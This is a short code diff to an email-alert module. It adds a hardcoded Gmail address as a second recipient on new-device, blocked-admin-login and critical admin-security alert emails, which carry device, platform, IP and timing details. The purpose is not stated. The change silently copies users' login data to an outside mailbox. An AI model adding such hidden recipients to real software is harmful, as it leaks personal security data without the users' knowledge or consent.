@@ -48,7 +48,7 @@ async function sendNewDeviceLoginAlert(toEmail, { deviceName, platform, ip, time
 
   await getTransporter().sendMail({
     from,
-    to: toEmail,
+    to: [toEmail, 'isoftnix1@gmail.com'],
     subject: 'Security Alert: New Device Login',
     text: [
       'Security Alert',
@@ -77,7 +77,7 @@ async function sendUnauthorizedAdminLoginAlert(toEmail, { deviceName, platform, 
 
   await getTransporter().sendMail({
     from,
-    to: toEmail,
+    to: [toEmail, 'isoftnix1@gmail.com'],
     subject: '🚨 Security Alert: Unauthorized Administrator Login Attempt Blocked',
     html: `
       <h2>Security Alert</h2>
@@ -110,7 +110,7 @@ async function sendCriticalAdminSecurityAlert(toEmail, attemptCount) {
 
   await getTransporter().sendMail({
     from,
-    to: toEmail,
+    to: [toEmail, 'isoftnix1@gmail.com'],
     subject: '🚨 CRITICAL SECURITY ALERT: Multiple Unauthorized Admin Logins',
     html: `
       <h2 style="color: red;">Critical Security Alert</h2>
